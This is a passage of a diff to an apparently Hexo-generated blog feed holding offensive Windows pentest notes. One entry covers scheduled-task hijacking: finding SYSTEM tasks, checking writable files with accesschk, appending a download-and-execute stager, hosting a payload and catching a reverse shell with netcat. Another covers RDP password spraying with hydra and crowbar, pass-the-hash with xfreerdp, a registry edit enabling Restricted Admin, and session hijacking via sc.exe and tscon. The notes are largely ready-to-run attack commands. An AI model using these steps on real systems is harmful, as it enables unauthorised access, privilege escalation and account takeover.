-<p>Sometimes we may be blocked because Restricted Admin Mode is disabled by default, so we can enable it using PowerShell and then try PtH again:</p>
+<p>Or via PowerShell.</p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Select-Object</span> TaskPath, TaskName, State</span><br></pre></td></tr></table></figure>
 
-
-<h1 id="RDP-Session-Hijacking"><a href="#RDP-Session-Hijacking" class="headerlink" title="RDP Session Hijacking"></a>RDP Session Hijacking</h1><blockquote>
-<p>If we get <code>SYSTEM privileges</code> on the target machine, we can hijack an active RDP session, potentially taking over a Domain Admin account.</p>
+<blockquote>
+<p>Inspect a scheduled task to determine the executable or script it launches.</p>
 </blockquote>
-<p>List active RDP sessions</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; query user</span><br><span class="line"></span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;twistzz               rdp<span class="literal">-tcp</span><span class="comment">#13          1  Active          7  8/25/2021 1:23 AM</span></span><br><span class="line"> test                  rdp<span class="literal">-tcp</span><span class="comment">#14          2  Active          *  8/25/2021 1:28 AM</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">schtasks /query /tn &quot;&lt;task_path&gt;\&lt;task_name&gt;&quot; /fo LIST /v</span><br></pre></td></tr></table></figure>
 
-<p>Creating a new service with <code>sc.exe</code> and attaching ourselves to another user session using <code>tscon</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; sc.exe create service<span class="literal">-name</span> binpath= <span class="string">&quot;cmd.exe /k tscon TARGET_SESSION_ID /dest: OUR_SESSION_NAME &quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] CreateService SUCCESS</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Or via PowerShell.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">Get-ScheduledTask</span> <span class="literal">-TaskPath</span> <span class="string">&quot;&lt;task_path&gt;&quot;</span> <span class="literal">-TaskName</span> <span class="string">&quot;&lt;task_name&gt;&quot;</span>).Actions</span><br></pre></td></tr></table></figure>
 
-<p>Start the service to hijack the session</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net <span class="built_in">start</span> service<span class="literal">-name</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Review the following fields:</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><p>Task To Run &#x2F; Action :  executable or script executed by the task.</p>
+</li>
+<li><p>Run As User : account used to execute the task.</p>
+</li>
+<li><p>Next Run Time : indicates when the payload will execute.</p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>We are interested in tasks that run as <code>SYSTEM</code> (or another privileged account) and execute a file we can modify.</p>
+</blockquote>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><blockquote>
+<p>Check whether the file executed by the scheduled task is writable.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">accesschk64.exe /accepteula -quvw &quot;&lt;executed_file&gt;&quot;</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>Or recursively check every file within the target directory.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">accesschk64.exe /accepteula -quvw -s &quot;&lt;directory&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>If the executed script is writable, append a download-and-execute stager that pulls our payload.</p>
+</blockquote>
+<blockquote>
+<p>Host the payload and start a listener.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Catch the incoming shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Wait for the scheduled task to execute.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>RDP</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Misconfigurations</category>
       </categories>
       <tags>
-        <tag>RDP</tag>
-        <tag>RDP-Session-Hijacking</tag>
-        <tag>Crowbar</tag>
-        <tag>Hydra</tag>
+        <tag>Windows</tag>
+        <tag>Privilege-Escalation</tag>
+        <tag>SYSTEM</tag>
+        <tag>AccessChk</tag>
+        <tag>Scheduled-Tasks</tag>
+        <tag>Task-Scheduler</tag>
+        <tag>schtasks</tag>
+        <tag>Get-ScheduledTask</tag>
+        <tag>Task-Hijacking</tag>
+        <tag>Writable-Scripts</tag>
+        <tag>Writable-Binaries</tag>
+        <tag>PowerShell</tag>
+        <tag>Persistence</tag>
       </tags>
   </entry>
   <entry>
@@ -2865,6 +2916,49 @@
         <category>Windows Privesc</category>
         <category>User</category>
       </categories>
+  </entry>
+  <entry>
+    <title>RDP Exploitation</title>
+    <url>/2025/12/04/RDP-Exploitation/</url>
+    <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
+
+<h4 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crowbar -b rdp -s ip/32 -U usernames.txt -c &#x27;Pwd&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Pass-The-Hash-ptt"><a href="#Pass-The-Hash-ptt" class="headerlink" title="Pass The Hash ( ptt )"></a>Pass The Hash ( ptt )</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>Sometimes we may be blocked because Restricted Admin Mode is disabled by default, so we can enable it using PowerShell and then try PtH again:</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="RDP-Session-Hijacking"><a href="#RDP-Session-Hijacking" class="headerlink" title="RDP Session Hijacking"></a>RDP Session Hijacking</h1><blockquote>
+<p>If we get <code>SYSTEM privileges</code> on the target machine, we can hijack an active RDP session, potentially taking over a Domain Admin account.</p>
+</blockquote>
+<p>List active RDP sessions</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; query user</span><br><span class="line"></span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;twistzz               rdp<span class="literal">-tcp</span><span class="comment">#13          1  Active          7  8/25/2021 1:23 AM</span></span><br><span class="line"> test                  rdp<span class="literal">-tcp</span><span class="comment">#14          2  Active          *  8/25/2021 1:28 AM</span></span><br></pre></td></tr></table></figure>
+
+<p>Creating a new service with <code>sc.exe</code> and attaching ourselves to another user session using <code>tscon</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; sc.exe create service<span class="literal">-name</span> binpath= <span class="string">&quot;cmd.exe /k tscon TARGET_SESSION_ID /dest: OUR_SESSION_NAME &quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] CreateService SUCCESS</span><br></pre></td></tr></table></figure>
+
+<p>Start the service to hijack the session</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net <span class="built_in">start</span> service<span class="literal">-name</span></span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>RDP</category>
+      </categories>
+      <tags>
+        <tag>RDP</tag>
+        <tag>RDP-Session-Hijacking</tag>
+        <tag>Crowbar</tag>
+        <tag>Hydra</tag>
+      </tags>
   </entry>
   <entry>
     <title>Server Operators</title>
